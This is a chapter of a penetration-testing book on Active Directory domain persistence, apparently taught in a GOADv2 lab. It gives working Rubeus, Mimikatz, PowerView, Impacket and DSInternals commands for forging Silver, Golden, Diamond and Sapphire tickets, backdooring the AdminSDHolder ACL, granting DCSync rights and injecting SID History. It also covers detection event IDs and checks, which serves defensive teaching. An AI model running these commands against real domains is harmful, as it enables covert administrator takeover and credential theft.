<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer210">
<h1 class="chapter-number" id="_idParaDest-133"><a id="_idTextAnchor146"/>7</h1>
<h1 id="_idParaDest-134"><a id="_idTextAnchor147"/>Persistence on Domain Level</h1>
<p>During an offensive operation, adversaries need to maintain their access to the target environment. Various activities such as reboots and changing users’ passwords can disrupt the operation’s flow. To overcome interruptions, there are techniques that allow us to achieve persistence. In this chapter, we will not cover host persistence techniques on Windows workstations and servers. Instead, we will focus our attention on domain-level persistence and techniques specific to domain controllers only. Our first topic is the most famous jewelry tickets (golden, silver, diamond, and sapphire). We will discuss the differences between them and demonstrate their practical usage with OpSec considerations. Other domain-level persistence topics, such as adding to a <strong class="bold">SID History</strong> attribute and an <strong class="source-inline">AdminSDHolder</strong> domain object ACL and DACL manipulation, and delegation privilege abuse, will be explained and illustrated with practical examples. We will close the domain-level persistence topic by covering <strong class="bold">DCShadow</strong> and Golden gMSA attacks. Domain controller persistence is mostly achieved by manipulating credentials via <strong class="bold">Skeleton Key</strong> attack, malicious <strong class="bold">Security Support Provider</strong> (<strong class="bold">SSP</strong>) registration, or access to a <strong class="bold">Directory Services Restore Mode</strong> (<strong class="bold">DSRM</strong>) hash. Lastly, we will explicate security descriptor manipulation for WMI, PS-Remoting and how to set up a registry backdoor to retrieve an NT hash of a computer, SAM, or cached <span class="No-Break">AD credentials.</span></p>
<p>In this chapter, we will cover the following <span class="No-Break">main topics:</span></p>
<ul>
<li>Domain persistence, in which we will cover forged tickets, a domain object’s ACL/attribute manipulation, a DCShadow attack, and a Golden <span class="No-Break">gMSA attack</span></li>
<li>Domain controller persistence, in which we will cover malicious SSP registration, Skeleton Key attack, dumping DSRM hash, a registry backdoor, and security descriptor manipulation (WMI <span class="No-Break">and PS-Remoting)</span></li>
</ul>
<h1 id="_idParaDest-135"><a id="_idTextAnchor148"/>Technical requirements</h1>
<p>In this chapter, you will need to have <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation or Oracle VM VirtualBox with at least 16 GB of RAM, 8 CPU cores, and at least 55 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>A Linux-based operating system is <span class="No-Break">strongly recommended</span></li>
<li>Vagrant installed with a plugin for the corresponding virtualization platform <span class="No-Break">and Ansible</span></li>
<li>From the GOADv2 project, we will use <strong class="source-inline">DC01</strong>, <strong class="source-inline">SRV01</strong>, <strong class="source-inline">DC03</strong>, and <strong class="source-inline">SRV03</strong> <span class="No-Break">virtual machines</span></li>
</ul>
<h1 id="_idParaDest-136"><a id="_idTextAnchor149"/>Domain persistence</h1>
<p>In this section, we<a id="_idIndexMarker569"/> will discuss various ways to achieve domain-level persistence. These techniques require high privileges equivalent to Domain Administrator. The most obvious way to achieve persistence in the target environment is to create and/or add compromised user or computer accounts to a highly privileged group. However, we will focus on more sophisticated techniques. Also, we will not discuss Group Policy abuse and targeted Kerberoasting from a persistence perspective, as the exploitation will be exactly the same as the examples from <a href="B18964_06.xhtml#_idTextAnchor119"><span class="No-Break"><em class="italic">Chapter 6</em></span></a>, only with a focus on privileged accounts. In the following techniques, we will rely either on privileged but rarely changed credential material (for example, the hash of a krbtgt account) or on attributes and <span class="No-Break">ACL manipulations.</span></p>
<h2 id="_idParaDest-137"><a id="_idTextAnchor150"/>Forged tickets</h2>
<p>We will <a id="_idIndexMarker570"/>start <a id="_idIndexMarker571"/>our journey with forged tickets – the types, their creation, their usage, and OpSec recommendations on how to stay under the radar. One important theoretical concept to mention is the <strong class="bold">Privileged Attribute Certificate</strong> (<strong class="bold">PAC</strong>). The PAC <a id="_idIndexMarker572"/>is used in the Kerberos protocol to distribute user rights to services, such as a username, SID, and group membership. The PAC is a part of every ticket and is encrypted with either a <strong class="bold">Key Distribution Center </strong>(<strong class="bold">KDC</strong>) key<a id="_idIndexMarker573"/> or a service account key. When we say that a ticket is forged, we mean that we place arbitrary PAC content in it. The first type of forged ticket we will examine is the <span class="No-Break">Silver Tic<a id="_idTextAnchor151"/>ket.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Great in-depth<a id="_idIndexMarker574"/> coverage of <a id="_idIndexMarker575"/>Golden and Silver Tickets can be found <span class="No-Break">here: </span><a href="https://en.hackndo.com/kerberos-silver-golden-tickets/"><span class="No-Break">https://en.hackndo.com/kerberos-silver-golden-tickets/</span></a><span class="No-Break">.</span></p>
<h3>Silver Ticket</h3>
<p>When a user <a id="_idIndexMarker576"/>needs access to a service, there are ST requests (<strong class="source-inline">KRB_TGS_REQ</strong>) and a reply (<strong class="source-inline">KRB_TGS_REP</strong>). The reply is encrypted with an NT hash of the account running the service. If an attacker has obtained the password or NT hash of the service account, it is possible to forge a PAC and, thus, the service ticket without interacting with the domain controller. Such a forged ticket is called a <strong class="bold">Silver Ticket</strong>. One <a id="_idIndexMarker577"/>small caveat about forging a PAC is that, ultimately, it will be double-signed with service account and krbtgt NT hashes. However, conveniently for us, with a service ticket, only the first signature is verified. It’s important to note that, since the Microsoft’s November 2021 patch, if a supplied username does not exist in the domain, the ticket will be rejected[1]. A Silver Ticket can be forged for a domain controller’s account <span class="No-Break">as well.</span></p>
<p>As an example, let us<a id="_idIndexMarker578"/> forge a Silver Ticket for the <strong class="source-inline">castelrock.sevenkingdoms.local</strong> server on a non-domain-joined machine, as the standard user, <strong class="source-inline">lord.varys</strong>. We will use Rubeus to create a ticket for user <strong class="source-inline">robert.baratheon</strong> (it can be any existing domain user), for the CIFS service on <strong class="source-inline">castelrock</strong>, with the AES256 key of the <span class="No-Break"><strong class="source-inline">castelrock$</strong></span><span class="No-Break"> account:</span></p>
<pre class="console">
runas /netonly /user:sevenkingdoms\lord.varys cmd
Rubeus.exe silver /user:robert.baratheon /domain:sevenking doms.local /aes256:9a0d511ea6556233b28c0c0ec576e120cfdb08c372ef 5a7c4def5c829666d75f /sid:S-1-5-21-4243769114-3325725031-2403382846 /service:cifs/castelrock.sevenkingdoms.local /ptt
ls \\castelrock.sevenkingdoms.local\c$</pre> <p>Rubeus has successfully injected <span class="No-Break">the ticket:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer170">
<img alt="Figure 7.1 – No access to the CIFS service before injecting the ticket" height="766" src="image/B18964_07_01.jpg" width="981"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.1 – No access to the CIFS service before injecting the ticket</p>
<p>After <a id="_idIndexMarker579"/>injecting <a id="_idIndexMarker580"/>the ticket, access to the CIFS service on <strong class="source-inline">castelrock</strong> <span class="No-Break">is granted:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer171">
<img alt="Figure 7.2 – The Silver Ticket provides access for lord.varys" height="506" src="image/B18964_07_02.jpg" width="707"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.2 – The Silver Ticket provides access for lord.varys</p>
<p>Detecting a<a id="_idIndexMarker581"/> Silver Ticket is a challenging task. It is stealthier than a<a id="_idIndexMarker582"/> Golden Ticket as the domain controller is not involved, and the service account NT hash is easier to obtain. The blue team would need to pull logs from servers and examine the event ID <strong class="source-inline">4769</strong> for a possible encryption downgrade (if RC4 is used instead of AES256). Windows logon/logoff events with IDs <strong class="source-inline">4624</strong> and <strong class="source-inline">4647</strong> can also provide information about the username, source IP address, and user’s SID. If we enable an audit for <strong class="source-inline">Success</strong> in the audit logon policy, event ID <strong class="source-inline">4627</strong> will show the group membership information of the logged-on user. The following is an example of the logon event <span class="No-Break">ID </span><span class="No-Break"><strong class="source-inline">4624</strong></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer172">
<img alt="Figure 7.3 – The missing username and domain, together with the IP address of the attacking machine" height="558" src="image/B18964_07_03.jpg" width="489"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.3 – The missing username and domain, together with the IP address of the attacking machine</p>
<p>Lastly, we may <a id="_idIndexMarker583"/>need to use the <strong class="source-inline">/nofullpacsig</strong> flag in Rubeus to exclude <strong class="source-inline">FullPacChecksum</strong>, which was introduced as a patch for <strong class="bold">CVE-2022-37967</strong>. This patch introduces checks for missing or invalid PAC signatures. If the patch has been applied, the registry key <strong class="source-inline">KrbtgtFullPacSignature</strong> will be created on a domain controller. At the time of writing, Microsoft is due to enforce the signature by October 2023. There is a stealthier alternative to this ticket, which has a valid PAC and is based on <strong class="source-inline">S4U2self</strong> abuse. Let’s look at <span class="No-Break">it next.</span></p>
<h3>A stealthy alternative to a Silver Ticket (S4U2self abuse)</h3>
<p>The <strong class="source-inline">S4U2self</strong> Kerberos<a id="_idIndexMarker584"/> extension allows a service to obtain a service ticket on behalf of a user to itself. It’s important to mention that <strong class="source-inline">S4U2self</strong> can <a id="_idIndexMarker585"/>be used by any account on a machine, including virtual or network service accounts, but on a network, it acts as the machine itself. <strong class="source-inline">S4U2self</strong> can help with local privilege escalation <a id="_idIndexMarker586"/>in a scenario when an attacker has compromised the virtual or network service account on a machine, such<a id="_idIndexMarker587"/> as AppPool or MSSQL, and then requests a service ticket for any user to themselves. Interestingly, users can even be from the <strong class="source-inline">Protected Users</strong> group<a id="_idIndexMarker588"/> or have the <strong class="bold">Account is sensitive and cannot be delegated</strong> <strong class="source-inline">UserAccountControl</strong> <span class="No-Break">property enabled.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">An example of local privilege escalation and original research by <em class="italic">Charlie Clark</em> can be found <span class="No-Break">here: </span><a href="https://exploit.ph/revisiting-delegate-2-thyself.xhtml"><span class="No-Break">https://exploit.ph/revisiting-delegate-2-thyself.xhtml</span></a><span class="No-Break">.</span></p>
<p>Now, we will demonstrate an alternative scenario to a Silver Ticket. I will use a non-domain-joined machine and the machine account NT hash <span class="No-Break">of </span><span class="No-Break"><strong class="source-inline">castelrock</strong></span><span class="No-Break">.</span></p>
<p>There are two steps in this attack – obtaining a TGT for the machine account and then using it for the <strong class="source-inline">S4U2self</strong> request to get a service ticket. In the first step, the attacker can request the machine’s account TGT in the usual way if the computer’s account hash is known. The following command will request <span class="No-Break">a TGT:</span></p>
<pre class="console">
Rubeus.exe asktgt /domain:sevenkingdoms.local /dc:kingslanding.sevenkingdoms.local /user:castelrock$ /rc4:b49f30381ea7ae249a1d8179802f6982 /nowrap</pre> <p>The result of the TGT request is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer173">
<img alt="Figure 7.4 – Obtaining the machine account’s TGT" height="698" src="image/B18964_07_04.jpg" width="1270"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.4 – Obtaining the machine account’s TGT</p>
<p>Then, an <a id="_idIndexMarker589"/>attacker<a id="_idIndexMarker590"/> can request a service ticket. Note the <strong class="source-inline">/self</strong> flag in order to impersonate <span class="No-Break">protected users:</span></p>
<pre class="console">
Rubeus.exe s4u /self /impersonateuser:robert.baratheon /dc:kingslanding.sevenkingdoms.local /altservice:"http/castelrock.sevenkingdoms.local" /ticket:"tgt_from_step_1" /nowrap /ptt
Invoke-Command -ComputerName castelrock.sevenkingdoms.local -Command {whoami;hostname}</pre> <p>The result is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer174">
<img alt="Figure 7.5 – Successful S42Uself abuse" height="728" src="image/B18964_07_05.jpg" width="1271"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.5 – Successful S42Uself abuse</p>
<p>The <a id="_idIndexMarker591"/>main advantage of <strong class="source-inline">S4U2self</strong> abuse over a Silver Ticket is that the <a id="_idIndexMarker592"/>service ticket has a valid PAC, not a forged one. Now, let us discuss a more dominant type of forged ticket – a <span class="No-Break"><strong class="bold">Golden Ticket</strong></span><span class="No-Break">.</span></p>
<h3>Golden Ticket</h3>
<p>A Golden Ticket is, in <a id="_idIndexMarker593"/>essence, a forged TGT ticket. With such a <a id="_idIndexMarker594"/>TGT ticket, we can request any service ticket as any user in the domain. There is a great analogy to understand better the difference between Silver and Golden tickets. A Silver Ticket is like a visa. You can enter the country (one server) and travel everywhere (request access to every service on this server). A Golden Ticket is like a passport. You can apply for a visa (access to the service) to every country in the world (any resource in <span class="No-Break">the domain).</span></p>
<p>To forge a TGT, we need to know<a id="_idIndexMarker595"/> the <strong class="bold">krbtgt</strong> account NT hash, which can only be obtained with domain administrator or replication privileges in the domain. Microsoft tried to stop Golden Ticket forgery in the patch (<strong class="source-inline">KB5008380</strong>) for <strong class="bold">CVE-2021-42287</strong>. The idea was to introduce a new data structure in the PAC containing the user’s SID. However, if the correct SID is supplied, an attack will be successful anyway[2]. There are two switches in Rubeus, <strong class="source-inline">/oldpac</strong> and <strong class="source-inline">/newpac</strong>, that can be used to forge the ticket, depending on the patch installation and <span class="No-Break">enforcement status.</span></p>
<p>We will <a id="_idIndexMarker596"/>create a<a id="_idIndexMarker597"/> Golden Ticket to access the <strong class="source-inline">kingslanding.sevenkingdoms.local</strong> filesystem from the <strong class="source-inline">castelrock.sevenkingdoms.local</strong> machine, authenticated as low-privileged <span class="No-Break">user </span><span class="No-Break"><strong class="source-inline">jaime.lannister</strong></span><span class="No-Break">:</span></p>
<pre class="console">
Rubeus.exe golden /user:robert.baratheon /domain:sevenkingdoms.local /aes256:2279187d6dfbacdc093cadef2964eb0afa1ef16af87cc638d34d3a4ea 49f1aa0 /sid:S-1-5-21-4243769114-3325725031-2403382846 /ptt
ls \\kingslanding.sevenkingdoms.local\c$</pre> <p>Before injecting a Golden Ticket, we have the <span class="No-Break">following screen:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer175">
<img alt="Figure 7.6 – The Golden Ticket forgery process" height="834" src="image/B18964_07_06.jpg" width="831"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.6 – The Golden Ticket forgery process</p>
<p>After <a id="_idIndexMarker598"/>injecting <a id="_idIndexMarker599"/>a Golden Ticket, we get the <span class="No-Break">following screen:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer176">
<img alt="Figure 7.7 – Access to the domain controller with a Golden Ticket" height="359" src="image/B18964_07_07.jpg" width="614"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.7 – Access to the domain controller with a Golden Ticket</p>
<p>Detecting<a id="_idIndexMarker600"/> a <a id="_idIndexMarker601"/>Golden Ticket is difficult. We need to examine logs with a particular focus on the ticket encryption type (a possible downgrade) and its lifetime. The ticket encryption type can be found in event ID <strong class="source-inline">4769</strong>. Non-default lifetime values in a TGT are a good indicator – for example, by default, in the domain ticket lifetime is 10 hours, but Mimikatz creates a ticket with a 10-year lifetime. If there are missing events with the ID <strong class="source-inline">4768</strong> (<strong class="bold">A Kerberos authentication Ticket Requested (TGT)</strong>) for events with the ID <strong class="source-inline">4769</strong> (<strong class="bold">A Kerberos service ticket</strong>), it is a clear sign of a Golden Ticket being used. Do we have anything stealthier and better? Yes, we do! <strong class="bold">Diamond Tickets</strong> will be <span class="No-Break">covered next.</span></p>
<h3>Diamond Ticket</h3>
<p>The idea<a id="_idIndexMarker602"/> of a Diamond Ticket <a id="_idIndexMarker603"/>evolved from a Diamond PAC attack and aims to be stealthier than Golden or Silver Tickets. The dance starts with a TGT being requested as a low-privileged user to obtain a legitimate ticket, and then the PAC is decrypted and modified, the signature is recalculated, and the ticket is encrypted again. Remember to use only already-existing domain users; otherwise, the ticket will be rejected in<a id="_idTextAnchor152"/> an <span class="No-Break">up-to-date environment.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">The original <a id="_idIndexMarker604"/>research about Diamond Ticket can be found <span class="No-Break">here: </span><a href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/"><span class="No-Break">https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/</span></a><span class="No-Break">.</span></p>
<p>Let us<a id="_idIndexMarker605"/> replicate the attack. For the first step, we will request a TGT for a standard user (<strong class="source-inline">jaime.lannister</strong>). Choosing the <strong class="source-inline">/tgtdeleg</strong> flag, we can use the Kerberos GSS-API to obtain a TGT for the current user without knowing the password. <strong class="source-inline">/krbkey</strong> is the AES key for the krbtgt account, <strong class="source-inline">/ticketuserid</strong> is the <strong class="bold">Relative Identifier</strong> (<strong class="bold">RID</strong>) of <strong class="source-inline">/ticketuser</strong>, and <strong class="source-inline">/groups</strong> specifies<a id="_idIndexMarker606"/> the group for the ticket. To perform these actions, we will use Rubeus with the <span class="No-Break">following arguments:</span></p>
<pre class="console">
Rubeus.exe diamond /tgtdeleg  /krbkey:2279187d6dfbacdc093cadef2964eb0afa1ef16af87cc638d34 d3a4ea49f1aa0 /ticketuser:robert.baratheon /ticketuserid:1113 /groups:512 /nowrap</pre> <p>An <a id="_idIndexMarker607"/>example of the user’s TGT request without the <strong class="source-inline">/tgtdeleg</strong> flag is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer177">
<img alt="Figure 7.8 – A low-privileged user-requested TGT" height="597" src="image/B18964_07_08.jpg" width="962"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.8 – A low-privileged user-requested TGT</p>
<p>PAC modification happens on the fly, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer178">
<img alt="Figure 7.9 – The modified TGT" height="223" src="image/B18964_07_09.jpg" width="960"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.9 – The modified TGT</p>
<p>Using the<a id="_idIndexMarker608"/> forged TGT, we can request a service ticket for the CIFS service on the domain controller with the <span class="No-Break">following command:</span></p>
<pre class="console">
Rubeus.exe asktgs /user:robert.baratheon /ticket:&lt;diamon_ticket_here&gt; /service:cifs/kingslanding.sevenkingdoms.local /ptt /nowrap</pre> <p>The ST request is <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer179">
<img alt="Figure 7.10 – Asking for ST" height="334" src="image/B18964_07_10.jpg" width="741"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.10 – Asking for ST</p>
<p>And we have access to the CIFS service running on the <span class="No-Break">domain controller:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer180">
<img alt="Figure 7.11 – CIFS service access" height="598" src="image/B18964_07_11.jpg" width="961"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.11 – CIFS service access</p>
<p>Detecting a <a id="_idIndexMarker609"/>Diamond Ticket is an even more non-trivial task, which<a id="_idIndexMarker610"/> requires ticket examination and checking that the values in the ticket match the default values in the domain. Event ID <strong class="source-inline">4627</strong> can show any extra group membership added to the low-privileged user. Discrepancies between the PAC’s value and the actual user’s privileges in AD can also be used to spot malicious activity. Lastly, we will talk about Sapphire Tickets, which are an even stealthier version of a <span class="No-Break">Diamond Ticket.</span></p>
<h3>Sapphire Ticket</h3>
<p>A Sapphire Ticket is<a id="_idIndexMarker611"/> an enhanced version of a Diamond Ticket<a id="_idIndexMarker612"/> that allows an attacker to mimic legitimate activity to an even greater extent. The idea is that instead of PAC modification in a legitimate TGT, as we did with the Diamond Ticket, we will copy a legitimate PAC of another high-privileged user through the <strong class="source-inline">S4U2self+u2u</strong> trick and replace it in the original TGT. In this scenario, we will avoid discrepancies between the PAC and effective user privileges. The following command uses the <strong class="source-inline">-impersonate</strong> flag that will create a <span class="No-Break">Sapphire Ticket:</span></p>
<pre class="console">
impacket-ticketer -request -impersonate 'robert.baratheon' -domain 'sevenkingdoms.local' -user 'jaime.lannister' -password 'cersei' -aesKey '2279187d6dfbacdc093cadef2964eb0afa1ef16af87cc638d34d3a4ea49f1aa0' -domain-sid 'S-1-5-21-4243769114-3325725031-2403382846' 'vinegrep'</pre> <p>At the time <a id="_idIndexMarker613"/>of writing, Sapphire Ticket functionality is not available in Rubeus or Impacket. Pull request <strong class="source-inline">1411</strong> was sent to Impacket, but it is still not merged with <span class="No-Break">main branch.</span></p>
<p>Detection <a id="_idIndexMarker614"/>of a Sapphire Ticket is still possible by the<a id="_idIndexMarker615"/> domain controller’s log analysis. The sequence of <strong class="source-inline">4768</strong> and <strong class="source-inline">4769</strong> events can be used to detect the immediate usage of the newly forged ticket. In the logs two different <strong class="source-inline">Account Name</strong> values will appear for the TGT and ST requests originating from the same <strong class="source-inline">Client Address</strong>, however, username in ST has never been logged into <span class="No-Break">that computer.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Diamond and <a id="_idIndexMarker616"/>Sapphire Tickets detection approaches are available at <a href="https://pgj11.com/posts/Diamond-And-Sapphire-Tickets/">https://pgj11.com/posts/Diamond-And-Sapphire-Tickets/</a> <span class="No-Break">and </span><a href="https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/"><span class="No-Break">https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/</span></a><span class="No-Break">.</span></p>
<p>Promising research about detecting forged tickets was presented by <em class="italic">Charlie Clark</em> and <em class="italic">Andrew Schwartz</em>. The idea is to decrypt the ticket and perform a detailed analysis of the ticket times and checksums. The blue team can create a custom Kerberos ticketing policy, enforce the <strong class="source-inline">logonHours</strong> attribute for users, and verify that checksums are correctly signed by the krbtgt key[3]. They also released a tool that automates most of these checks, called <strong class="bold">WonkaVision</strong>. You <a id="_idIndexMarker617"/>can download it <span class="No-Break">from GitHub[4].</span></p>
<p>The next section will focus on achieving persistence via manipulation via the ACL or attributes of different <span class="No-Break">domain objects.</span></p>
<h2 id="_idParaDest-138"><a id="_idTextAnchor153"/>A domain object’s ACL and attribute manipulations</h2>
<p>In this section, we will <a id="_idIndexMarker618"/>cover techniques to achieve persistence via ACL and attribute manipulation on various domain objects. Typical ACL manipulation targets are <strong class="source-inline">AdminSDHolder</strong> and domain objects. Attribute alteration attacks will aim for <strong class="source-inline">SIDHistory</strong>, userAccountControl, SPN, and <span class="No-Break">delegation attributes.</span></p>
<h3>AdminSDHolder</h3>
<p>The <a id="_idIndexMarker619"/>AdminSDHolder domain object in AD was introduced by Microsoft to prevent ACL modification of high-privileged accounts <span class="No-Break">and groups.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A default list of protected objects can be found <span class="No-Break">here: </span><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory"><span class="No-Break">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory</span></a><span class="No-Break">.</span></p>
<p>To manually find accounts and groups that are part of AdminSDHolder, we can search for the <strong class="source-inline">adminCount</strong> attribute and check that it is set to <strong class="source-inline">1</strong> in their properties. The idea is that the AdminSDHolder object provides a preset security permission template that the Security Descriptor Propagator process applies every 60 minutes, protecting accounts <span class="No-Break">and groups.</span></p>
<p><em class="italic">Sean Metcalf</em> discovered this technique. With domain administrator rights, an attacker can add an arbitrary user account to the AdminSDHolder ACL. After propagation, the user account will have the <strong class="source-inline">GenericAll</strong> right over privileged groups and accounts in the domain. PowerView makes the <span class="No-Break">exploitation trivial:</span></p>
<pre class="console">
Add-DomainObjectAcl -PrincipalIdentity jaime.lannister -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=sevenkingdoms,DC=local' -Rights All -Verbose</pre> <p>In 60 minutes, we can see that our user account was added to the <span class="No-Break">AdminSDHolder DACL:</span></p>
<pre class="console">
Get-DomainObjectAcl -Identity 'CN=AdminSDHolder,CN=System,DC=sevenkingdoms,DC=local' | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericAll")} | select securityidentifier
Get-DomainObjectAcl -Identity 'Domain Admins' | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericAll")} | select securityidentifier</pre> <p>The attack <a id="_idIndexMarker620"/>is illustrated in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer181">
<img alt="Figure 7.12 – jaime.lannister was added to the DACL of the AdminSDHolder domain object" height="624" src="image/B18964_07_12.jpg" width="841"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.12 – jaime.lannister was added to the DACL of the AdminSDHolder domain object</p>
<p>When necessary, the attacker will log in as <strong class="source-inline">jaime.lannister</strong> and add himself to the <strong class="source-inline">domain </strong><span class="No-Break"><strong class="source-inline">admins</strong></span><span class="No-Break"> group:</span></p>
<pre class="console">
net group "domain admins" jaime.lannister /add /domain</pre> <p>The result <a id="_idIndexMarker621"/>can be observed in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer182">
<img alt="Figure 7.13 – The jaime.lannister user account was added to the Domain Admins group" height="580" src="image/B18964_07_13.jpg" width="817"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.13 – The jaime.lannister user account was added to the Domain Admins group</p>
<p>There are two ways to detect this technique. We can review the ACL of the AdminSDHolder object on a regular basis to ensure that no alterations have been made, and we can monitor users and groups with <strong class="source-inline">adminCount</strong> = <strong class="source-inline">1</strong>. Now, we will discuss how to add privileges to the domain <span class="No-Break">object itself.</span></p>
<h3>Domain</h3>
<p>With <a id="_idIndexMarker622"/>domain administrator privileges, we can grant to any user under our control <strong class="source-inline">DCSync</strong> privileges. As a result, a low-privileged user will be able to retrieve hashes for all users in the domain. The PowerView command to add DCSync privileges is <span class="No-Break">shown here:</span></p>
<pre class="console">
Add-DomainObjectACL -PrincipalIdentity renly.baratheon -TargetIdentity "dc=sevenkingdoms,dc=local" -Rights DCSync -Verbose</pre> <p>Then, we return to our low-privileged user and run the following <span class="No-Break">Mimikatz command:</span></p>
<pre class="console">
mimikatz.exe "lsadump::dcsync /all /csv"</pre> <p>The result of the successful DCSync attack is <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer183">
<img alt="Figure 7.14 – Add DCSync privileges to the user and extract hashes" height="372" src="image/B18964_07_14.jpg" width="517"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.14 – Add DCSync privileges to the user and extract hashes</p>
<p>DCSync <a id="_idIndexMarker623"/>attack detection was covered earlier in <a href="B18964_04.xhtml#_idTextAnchor061"><span class="No-Break"><em class="italic">Chapter 4</em></span></a><span class="No-Break">.</span></p>
<p>Now, we are move on to domain object attribute manipulation. We will start with our old friend – <span class="No-Break">SID History.</span></p>
<h3>SID History</h3>
<p>We discussed<a id="_idIndexMarker624"/> SID History in detail in <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a> when we covered lateral movement between forests. Surprisingly, SID History also works for SIDs from the same domain, meaning that if we add a privileged SID in the SID History attribute, a regular user will effectively become a <span class="No-Break">domain administrator.</span></p>
<p>Before Windows Server 2016, an attacker could use Mimikatz to add <span class="No-Break">SID History:</span></p>
<pre class="console">
mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:jaime.lannister /new:S-1-5-21-4243769114-3325725031-2403382846-519"</pre> <p>However, the <strong class="source-inline">sid::patch</strong> command in Windows Server 2016 has stopped this attack from working and displays the following error <span class="No-Break">when executed:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer184">
<img alt="Figure 7.15 – An error while adding SID History via Mimikatz" height="281" src="image/B18964_07_15.jpg" width="731"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.15 – An error while adding SID History via Mimikatz</p>
<p>The only <a id="_idIndexMarker625"/>known way to directly add SID History on modern domain controllers is described here[5]. It involves the installation of the DSInternals PowerShell module on a domain controller and an NTDS <span class="No-Break">service restart:</span></p>
<pre class="console">
Get-ADUser -Identity lord.varys -Properties sidhistory, memberof
Get-ADUser -Identity cersei.lannister -Properties sidhistory, memberof
Stop-service NTDS -Force
Add-ADDBSidHistory -samaccountname lord.varys -sidhistory S-1-5-21-4243769114-3325725031-2403382846-1111 -DBPath C:\Windows\ntds\ntds.dit -Force
Start-service NTDS
Get-ADUser -Identity lord.varys -Properties sidhistory, memberof</pre> <p>As a result, the user <strong class="source-inline">lord.varys</strong> has a domain administrator SID added to his history, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer185">
<img alt="Figure 7.16 – SID History was added to the lord.varys user" height="823" src="image/B18964_07_16.jpg" width="687"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.16 – SID History was added to the lord.varys user</p>
<p>To detect this technique, we can configure auditing for events ID <strong class="source-inline">4765</strong> (<strong class="bold">SID History was added to an account</strong>) and <strong class="source-inline">4766</strong> (<strong class="bold">An attempt to add SID History to an account failed</strong>) on the domain controller. Another way is to use PowerShell to discover users with a matching domain SID in their <span class="No-Break">SID History:</span></p>
<pre class="console">
[string]$DomainSID = ((Get-ADDomain).DomainSID.Value)
Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory | Where {$_.SIDHistory -Like "$DomainSID-*"}</pre> <p>Our persistence<a id="_idIndexMarker626"/> trick was successfully detected, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer186">
<img alt="Figure 7.17 – A user with suspicious SID History detected" height="274" src="image/B18964_07_17.jpg" width="690"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.17 – A user with suspicious SID History detected</p>
<p>The upcoming technique is similar to this one, but now, we will change the computer’s attribute to become a <span class="No-Break">domain controller.</span></p>
<h3>Server (Un)Trust Account</h3>
